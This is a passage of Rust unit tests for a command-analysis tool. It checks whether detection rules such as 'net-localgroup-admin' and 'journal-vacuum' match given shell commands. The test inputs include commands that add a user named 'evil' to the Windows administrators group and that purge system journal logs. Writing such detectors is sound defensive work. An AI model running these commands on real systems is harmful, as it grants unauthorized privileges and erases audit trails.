        // (and overlap with net-localgroup-admin).
        assert!(!fires("net localgroup users bob /add", "net-localgroup"));
        assert!(!fires("net localgroup admins /delete", "net-localgroup"));
        assert!(fires(
            "net localgroup administrators evil /add",
            "net-localgroup-admin"
        ));
    }

    /// `journal-vacuum` was keyed on the bare `--vacuum` substring; it now scopes
    /// to `journalctl` so an unrelated `--vacuum*` flag does not match.
    #[test]
    fn journal_vacuum_is_scoped_to_journalctl() {
        let kb = kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(fires("journalctl --vacuum-size=1M", "journal-vacuum"));
        assert!(fires("sudo journalctl --vacuum-time=2d", "journal-vacuum"));
        assert!(!fires("some-db-tool --vacuum-database", "journal-vacuum"));
    }
}
